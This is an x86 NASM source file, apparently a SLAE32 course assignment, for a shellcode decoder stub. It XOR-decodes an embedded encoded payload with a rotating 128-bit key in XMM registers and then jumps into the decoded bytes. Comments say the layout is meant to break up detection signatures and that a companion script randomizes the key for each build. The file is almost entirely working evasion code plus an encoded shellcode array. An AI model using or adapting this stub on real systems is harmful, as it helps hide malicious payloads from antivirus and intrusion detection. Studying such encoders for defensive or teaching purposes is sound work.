; Title: XMM decoder shellcode
; Filename: xmm_xor_decoder.nasm
; Author:  Mark Shaneck
; Website:  http://markshaneck.com
;
; A more detailed description of this code can be found at
; http://markshaneck.com/SLAE32/slae32-assignment4
;
; Purpose: Decode shellcode that has been encoded through 
; an xor with a 128 bit value that gets rotated left by
; a particular amount. This code is not intended to be 
; used directly but as a way to create a template for 
; the associated python script to autogenerate it, since 
; the xor key and the shift amount will be randomized for 
; each run

global _start

section .text
_start:
    jmp get_keys

got_keys:
    pop esi            ; esi contains the address of the xor key
    xor ecx,ecx
    movdqu xmm1, [esi] ; put the xor key into xmm1
    pxor xmm3,xmm3     ; put a zero in xmm3 for end point check
    jmp short move_on

; put the data in the middle to break up the signature somewhat, since
; the 128 bit xorkey will be random each time
get_keys:
    call got_keys

    ; the xorkey will be a random value
    xorKey: db 0x71,0x6a,0xc9,0xfc,0xfe,0x1a,0xd1,0x09,0xb4,0x9c,0x2b,0x7f,0xce,0x75,0x8f,0xc4

move_on:
    jmp short get_shellcode

got_shellcode:    
    pop esi      ; now the shellcode address is loaded into esi
    mov edx,esi  ; we will update esi, so edx will save the start point

decode_loop:
    movdqu xmm0, [esi]  ; put the first block of encoded shellcode into xmm0
    
    pxor xmm0,xmm1  ; decode that next block
    movdqu [esi],xmm0
    
    ; check to see if that value in xmm0 is 0
    ; xmm3 contains all zeros
    ; so we can use vptest and jc 
    ; vptest xmm3,xmm0 sets the CF if xmm0 AND NOT xmm3 is all zeros
    ; that is, since xmm3 is zero, not xmm3 is all 1s
    ; so xmm0 and not xmm3 will be all zeros if xmm0 is all zeros
    vptest xmm3,xmm0
    jnc rotate_key
    jmp edx

rotate_key:
    ; before we increment esi and loop, rol the key by shiftvalue bytes
    ; these shift values will be dynamically generated by the encoder script
    ; hard code for now
    movdqu xmm2,xmm1 ; copy so we can rotate the key
    pslldq xmm1, 0x9 ; rotate left by shift key  --> this needs to get replaced with the random value
    psrldq xmm2, 0x7 ; rotate right by remainder --> this needs to get replaced with the random value
    por xmm1,xmm2   ; OR together to get rotate left

    ; skip to the next block of encoded shellcode
    add esi, 0x10

    jmp short decode_loop

get_shellcode:
    call got_shellcode
    shellcode: db 0x40,0xa3,0x3e,0x1d,0xcf,0xc1,0x61,0x0d,0x07,0x9d,0xc0,0x74,0x97,0xc7,0x82,0x09,0x89,0x04,0x9d,0x1a,0xa4,0x03,0xf5,0x67,0x34,0x8e,0x95,0x36,0xb4,0x9b,0x76,0xbd,0xe0,0xe4,0x06,0x05,0xbb,0x90,0x9a,0x3b,0xdb,0x09,0xb4,0x9c,0x2b,0x7f,0xce,0x75,0x1a,0xd1,0x09,0xb4,0x9c,0x2b,0x7f,0xce,0x75,0x8f,0xc4,0x71,0x6a,0xc9,0xfc,0xfe

